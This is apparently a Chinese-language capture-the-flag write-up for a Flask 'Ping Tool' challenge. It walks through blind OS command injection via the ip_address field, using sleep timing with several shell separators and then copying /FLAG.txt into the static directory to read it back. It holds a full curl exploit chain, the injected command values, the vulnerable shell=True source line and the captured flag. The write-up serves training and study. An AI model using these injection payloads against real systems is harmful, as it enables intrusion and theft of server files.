## 题解

### 入口与指纹

`Werkzeug/3.0.6` + `Python/3.8.20`，页面标题 **`Ping Tool`**：

```html
<form action="/ping" method="post">
  <input type="text" name="ip_address" placeholder="Enter IP Address" required>
</form>
```

经典形态：把用户输入拼进 `ping` 命令。

### 关键观察

**1. 页面只回一句「Host is reachable!」，看不到命令输出。**

```bash
curl -X POST --data-urlencode 'ip_address=127.0.0.1;id' http://$T/ping
```

```html
<h1>Ping Result for 127.0.0.1;id</h1>
<pre>Host is reachable!</pre>
```

标题里回显原始输入，正文只给一个布尔结论——**输出通道被关掉了**。
但这不代表没执行。

**2. 用时间差确认注入真的生效。**

| ip_address | 响应时间 |
| --- | --- |
| `127.0.0.1` | 1.14 s |
| `127.0.0.1;sleep 3` | **4.20 s** |
| `127.0.0.1&&sleep 3` | 4.11 s |
| `127.0.0.1\|sleep 3` | 3.09 s |
| `$(sleep 3)` | 3.09 s |
| `127.0.0.1\`sleep 3\`` | 4.20 s |

四种分隔符（`;`、`&&`、`|`、`$()`、反引号）全部生效 → **盲命令注入**。

**3. 把 flag 写进静态目录，用 HTTP 读回来。**

Flask 的 `/static/` 实际映射到 `/app/static/`（先写 `ls /app/static` 到文件里验证过）：

```bash
ip_address=127.0.0.1;cp /FLAG.txt /app/static/leak.txt
```

然后直接取：

```bash
curl http://$T/static/leak.txt
```

### 利用链

```bash
T=$(head -1 .target)

# 1. 时间盲注确认注入
time curl -sS -X POST --data-urlencode 'ip_address=127.0.0.1;sleep 3' "http://$T/ping"

# 2. 确认可写目录（可选）
curl -sS -X POST --data-urlencode 'ip_address=127.0.0.1;ls /app/static > /app/static/ls.txt' "http://$T/ping"
curl -sS "http://$T/static/ls.txt"

# 3. 把 flag 落到静态目录
curl -sS -X POST --data-urlencode 'ip_address=127.0.0.1;cp /FLAG.txt /app/static/leak.txt' "http://$T/ping"

# 4. 读回来
curl -sS "http://$T/static/leak.txt"
```

```text
flag{ceeb4b5c-9358-4ae1-a3e5-b6cc02789892}
```

### flag 位置

容器根目录的 **`/FLAG.txt`**（大写，42 字节）。落地到 `/app/static/leak.txt` 后
经 `/static/leak.txt` 读取。

读回源码确认实现（`/app/app.py`）：

```python
command = 'ping -c 2 ' + ip_address
stdout, stderr = subprocess.Popen(command, shell=True, stdout=..., stderr=...).communicate()
if " bytes from" in ping_output:
    summary_output = "Host is reachable!"
```

即 `shell=True` 的字符串拼接，但程序只判断输出里有没有 ` bytes from`，
所以命令输出看不到——这正是「盲注入」。

## 复盘

- **「没有输出」不等于「没有执行」。** 页面只回布尔值时，用 `sleep` 做时间盲注，
  一次就能确认注入；这比继续猜 payload 有效得多。
- **盲注之后要找输出通道。** 最省事的是把结果写进**静态目录**，再用 HTTP 取回；
  判据是先写一个 `ls` 到文件里，确认目录可写且可通过 URL 访问。
- **先确认 docroot 的映射关系。** 这题 `/static/` → `/app/static/`，
  是通过写 `ls` 结果到该目录、再请求 URL 验证出来的，不是猜的。
- **多个分隔符一起试。** `;`、`&&`、`|`、`$()`、反引号在本例全部有效，
  说明是裸 `shell=True` 拼接；真实环境里可能只留一种，全试一次成本很低。
- **flag 文件名又是大写 `/FLAG.txt`。** `ls -la /`、`ls /tmp`、`ls /app` 都确认过：
  只有根目录有 `FLAG.txt`（42 字节），`/tmp` 和 `/app` 下没有副本。
